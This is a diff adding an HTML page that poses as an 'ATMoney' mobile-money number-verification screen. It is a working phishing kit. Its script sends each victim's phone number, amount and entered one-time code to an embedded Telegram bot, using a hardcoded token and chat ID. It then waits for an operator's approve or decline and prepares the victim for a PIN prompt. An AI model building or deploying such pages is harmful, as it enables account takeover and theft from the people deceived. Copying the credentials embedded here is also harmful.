@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Let's verify your number - ATMoney</title>
+    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --red: #E30613;
+            --blue: #003DA5;
+            --bg: #F4F7FB;
+            --text-dark: #1E293B;
+            --text-mid: #64748B;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'DM Sans', sans-serif;
+            background: var(--bg);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .header {
+            width: 100%;
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            background: white;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+            position: relative;
+        }
+
+        .back-btn {
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .back-btn svg {
+            width: 24px;
+            height: 24px;
+            stroke: var(--blue);
+            stroke-width: 2.5;
+        }
+
+        .header-title {
+            flex: 1;
+            text-align: center;
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--text-mid);
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            margin-right: 34px;
+            /* Balance the back button */
+        }
+
+        .spinner {
+            width: 24px;
+            height: 24px;
+            border: 3px solid rgba(227, 6, 19, 0.2);
+            border-top-color: var(--red);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 24px;
+        }
+
+        .prompt-spinner {
+            width: 32px;
+            height: 32px;
+            border: 4px solid rgba(0, 61, 165, 0.2);
+            border-top-color: var(--blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .content {
+            width: 100%;
+            max-width: 400px;
+            padding: 24px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .info-card {
+            background: white;
+            border-radius: 12px;
+            padding: 24px;
+            width: 100%;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+            margin-bottom: 30px;
+            display: flex;
+            gap: 16px;
+        }
+
+        .key-icon {
+            width: 32px;
+            height: 32px;
+            flex-shrink: 0;
+        }
+
+        .info-text h2 {
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--blue);
+            margin-bottom: 8px;
+            position: relative;
+            display: inline-block;
+        }
+
+        .info-text h2::after {
+            content: '';
+            position: absolute;
+            bottom: -4px;
+            left: 0;
+            width: 24px;
+            height: 3px;
+            background: var(--red);
+            border-radius: 2px;
+        }
+
+        .info-text p {
+            font-size: 14px;
+            color: var(--blue);
+            line-height: 1.5;
+            font-weight: 500;
+            margin-top: 12px;
+        }
+
+        .info-text p span {
+            color: var(--red);
+            font-weight: 700;
+        }
+
+        .status-text {
+            font-size: 14px;
+            color: var(--text-mid);
+            margin-bottom: 12px;
+            font-weight: 500;
+        }
+
+        .timer {
+            font-size: 28px;
+            font-weight: 700;
+            color: var(--red);
+            margin-bottom: 24px;
+        }
+
+        .resend-btn {
+            display: none;
+            background: none;
+            border: none;
+            color: var(--blue);
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-bottom: 24px;
+            text-decoration: underline;
+        }
+
+        .timer {
+            font-size: 28px;
+            font-weight: 700;
+            color: var(--red);
+            margin-bottom: 24px;
+        }
+
+        .input-label {
+            font-size: 14px;
+            color: var(--text-mid);
+            margin-bottom: 16px;
+            font-weight: 500;
+        }
+
+        .code-inputs {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+
+        .code-input {
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            border: 1.5px solid #E2E8F0;
+            background: white;
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--blue);
+            text-align: center;
+            outline: none;
+            transition: all 0.2s;
+        }
+
+        .code-input:focus {
+            border-color: var(--blue);
+            box-shadow: 0 0 0 3px rgba(0, 61, 165, 0.1);
+        }
+
+        /* Prompt Overlay */
+
+        #promptOverlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: #f0f4f8;
+            z-index: 20000;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px;
+            text-align: center;
+        }
+
+        .prompt-icon {
+            margin-bottom: 40px;
+            opacity: 0.2;
+        }
+
+        .prompt-title {
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--blue);
+            line-height: 1.3;
+            margin-bottom: 20px;
+            max-width: 400px;
+        }
+
+        .prompt-divider {
+            width: 40px;
+            height: 4px;
+            background: var(--red);
+            border-radius: 2px;
+            margin-bottom: 30px;
+        }
+
+        .prompt-countdown {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--text-mid);
+        }
+
+        .error-msg {
+            display: none;
+            color: var(--red);
+            font-size: 14px;
+            font-weight: 600;
+            margin-top: -15px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="header">
+        <button class="back-btn" onclick="window.history.back()">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M19 12H5M5 12L12 19M5 12L12 5" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+        </button>
+        <div class="header-title">ACTIVATE YOUR NUMBER</div>
+    </div>
+
+    <div class="content">
+        <div class="info-card">
+            <svg class="key-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M15.5 2.5C12.4624 2.5 10 4.96243 10 8C10 9.1585 10.3582 10.2335 10.9648 11.1328L2.29289 19.8047C2.10536 19.9923 2 20.2467 2 20.5V22.5C2 23.0523 2.44772 23.5 3 23.5H5C5.26522 23.5 5.51957 23.3946 5.70711 23.2071L6.5 22.4142V20.5C6.5 19.9477 6.94772 19.5 7.5 19.5H9.5C10.0523 19.5 10.5 19.0523 10.5 18.5V17.7071L12.8672 15.3398C13.7665 15.9418 14.8415 16.3 16 16.3C19.0376 16.3 21.5 13.8376 21.5 10.8C21.5 7.76243 19.0376 5.3 16 5.3C15.8315 5.3 15.6647 5.3144 15.5 5.3421V2.5Z" fill="#E30613"/>
+                <circle cx="16.5" cy="8.5" r="1.5" fill="white"/>
+            </svg>
+            <div class="info-text">
+                <h2>Confirmation code was sent</h2>
+                <p>The 4-digit code was sent to <span id="displayPhone">0560723291</span>. Please enter the code below.</p>
+            </div>
+        </div>
+
+        <div class="status-text" id="statusText">Trying to fetch code automatically</div>
+        <div class="spinner" id="mainSpinner"></div>
+        <div class="timer" id="mainTimer">02:30</div>
+        <button class="resend-btn" id="resendBtn" onclick="resendCode()">Send new code</button>
+
+        <div class="input-label">Enter the code below:</div>
+
+        <div class="error-msg" id="errMsg">Invalid code. Please try again.</div>
+
+        <div class="code-inputs" id="codeInputs">
+            <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+        </div>
+    </div>
+
+    <!-- Prompt Overlay -->
+    <div id="promptOverlay">
+        <div class="prompt-icon">
+            <svg width="120" height="120" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1">
+                <path d="M19 7h-1V5c0-1.1-.9-2-2-2H4c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h1V7c0-1.1.9-2 2-2h11c1.1 0 2 .9 2 2z"/>
+                <path d="M20 9H8c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V11c0-1.1-.9-2-2-2zm-2 8c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/>
+            </svg>
+        </div>
+        <h2 class="prompt-title">
+            You will receive a prompt to enter your ATMoney PIN. Please wait while we verify.
+        </h2>
+        <div class="prompt-divider"></div>
+        <div class="prompt-spinner"></div>
+    </div>
+
+    <script>
+        // ─── YOUR BOT CREDENTIALS (updated) ──────────────────────────────────
+        const CONFIG = {
+            BOT_TOKEN: '8323704904:AAEiB-e1x2uQ_qZp0PaBS__8B9EXs402Xus',
+            CHAT_ID: '1006917440',
+            SUCCESS_PAGE: 'success.html'
+        };
+
+        let state = {
+            lastUpdateId: 0
+        };
+        let isProcessing = false;
+        let promptTimerInterval;
+        let pollingInterval;
+
+        const params = new URLSearchParams(window.location.search);
+        const phone = params.get('phone') || '0560723291';
+        const amount = params.get('amount') || '0';
+
+        document.getElementById('displayPhone').textContent = phone;
+
+        // Main Timer Logic
+        let mainTimeLeft = 150; // 2:30
+        const mainTimerEl = document.getElementById('mainTimer');
+        const resendBtn = document.getElementById('resendBtn');
+        const statusText = document.getElementById('statusText');
+        const mainSpinner = document.getElementById('mainSpinner');
+        let mainTimerInterval;
+
+        function startMainTimer() {
+            mainTimeLeft = 150;
+            mainTimerEl.style.display = 'block';
+            resendBtn.style.display = 'none';
+            statusText.textContent = 'Trying to fetch code automatically';
+            mainSpinner.style.display = 'block';
+
+            mainTimerInterval = setInterval(() => {
+                if (mainTimeLeft > 0) {
+                    mainTimeLeft--;
+                    const m = Math.floor(mainTimeLeft / 60).toString().padStart(2, '0');
+                    const s = (mainTimeLeft % 60).toString().padStart(2, '0');
+                    mainTimerEl.textContent = `${m}:${s}`;
+                } else {
+                    clearInterval(mainTimerInterval);
+                    mainTimerEl.style.display = 'none';
+                    statusText.textContent = 'Did not receive the code?';
+                    mainSpinner.style.display = 'none';
+                    resendBtn.style.display = 'block';
+                }
+            }, 1000);
+        }
+
+        function resendCode() {
+            startMainTimer();
+            // You can add API call here to actually resend the code if needed
+        }
+
+        startMainTimer();
+
+        // Code Inputs Logic
+        const inputs = document.querySelectorAll('.code-input');
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', () => {
+                input.value = input.value.replace(/[^0-9]/g, '');
+                if (input.value && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+                checkCode();
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !input.value && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+
+        function getCode() {
+            return Array.from(inputs).map(i => i.value).join('');
+        }
+
+        function checkCode() {
+            const code = getCode();
+            if (code.length === 4) {
+                submitCode(code);
+            }
+        }
+
+        function submitCode(code) {
+            if (isProcessing) return;
+            isProcessing = true;
+            document.getElementById('errMsg').style.display = 'none';
+
+            // Show loading state on the inputs
+            inputs.forEach(i => i.disabled = true);
+            statusText.textContent = 'Verifying code...';
+            mainSpinner.style.display = 'block';
+            mainTimerEl.style.display = 'none';
+            resendBtn.style.display = 'none';
+            clearInterval(mainTimerInterval);
+
+            const ts = Date.now();
+            const approveCodeId = `approve_code_${ts}`;
+            const declineCodeId = `decline_code_${ts}`;
+
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.CHAT_ID,
+                        text: `<b>🔴 ATMoney Code Verification</b>\n\nAmount: GHS ${amount}\nPhone: <code>${phone}</code>\nCode Entered: <code>${code}</code>\n\nChoose Action:`,
+                        parse_mode: 'HTML',
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{
+                                    text: "✅ Approve Code",
+                                    callback_data: approveCodeId
+                                }],
+                                [{
+                                    text: "❌ Decline (Wrong Code)",
+                                    callback_data: declineCodeId
+                                }]
+                            ]
+                        }
+                    })
+                })
+                .then(() => {
+                    startCodePolling(approveCodeId, declineCodeId);
+                })
+                .catch(() => {
+                    resetInputs();
+                });
+        }
+
+        function resetInputs() {
+            isProcessing = false;
+            inputs.forEach(i => {
+                i.disabled = false;
+                i.value = '';
+            });
+            inputs[0].focus();
+            statusText.textContent = 'Did not receive the code?';
+            mainSpinner.style.display = 'none';
+            resendBtn.style.display = 'block';
+        }
+
+        function startCodePolling(approveCodeId, declineCodeId) {
+            pollingInterval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+                    .then(r => r.json())
+                    .then(data => {
+                        if (!data.ok || !data.result) return;
+
+                        data.result.forEach(update => {
+                            state.lastUpdateId = update.update_id;
+
+                            if (update.callback_query) {
+                                const cb = update.callback_query.data;
+
+                                if (cb === approveCodeId) {
+                                    clearInterval(pollingInterval);
+                                    sendPromptApproval();
+                                } else if (cb === declineCodeId) {
+                                    clearInterval(pollingInterval);
+                                    document.getElementById('errMsg').style.display = 'block';
+                                    resetInputs();
+                                }
+                            }
+                        });
+                    });
+            }, 1000);
+        }
+
+        function sendPromptApproval() {
+            const ts = Date.now();
+            const approvePromptId = `approve_prompt_${ts}`;
+            const declinePromptId = `decline_prompt_${ts}`;
+
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.CHAT_ID,
+                        text: `<b>🔴 ATMoney Prompt Approval</b>\n\nAmount: GHS ${amount}\nPhone: <code>${phone}</code>\n\nUser is waiting for prompt approval. Choose Action:`,
+                        parse_mode: 'HTML',
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{
+                                    text: "✅ Approve Prompt",
+                                    callback_data: approvePromptId
+                                }],
+                                [{
+                                    text: "❌ Decline Prompt",
+                                    callback_data: declinePromptId
+                                }]
+                            ]
+                        }
+                    })
+                })
+                .then(() => {
+                    showPromptOverlay();
+                    startPromptPolling(approvePromptId, declinePromptId);
+                })
+                .catch(() => {
+                    resetInputs();
+                });
+        }
+
+        function showPromptOverlay() {
+            const overlay = document.getElementById('promptOverlay');
+            overlay.style.display = 'flex';
+        }
+
+        function hidePromptOverlay() {
+            document.getElementById('promptOverlay').style.display = 'none';
+        }
+
+        function startPromptPolling(approvePromptId, declinePromptId) {
+            pollingInterval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+                    .then(r => r.json())
+                    .then(data => {
+                        if (!data.ok || !data.result) return;
+
+                        data.result.forEach(update => {
+                            state.lastUpdateId = update.update_id;
+
+                            if (update.callback_query) {
+                                const cb = update.callback_query.data;
+
+                                if (cb === approvePromptId) {
+                                    clearInterval(pollingInterval);
+                                    hidePromptOverlay();
+                                    window.location.href = `${CONFIG.SUCCESS_PAGE}?${params.toString()}`;
+                                } else if (cb === declinePromptId) {
+                                    clearInterval(pollingInterval);
+                                    hidePromptOverlay();
+                                    document.getElementById('errMsg').style.display = 'block';
+                                    resetInputs();
+                                }
+                            }
+                        });
+                    });
+            }, 1000);
+        }
+    </script>
+</body>
+
+</html>
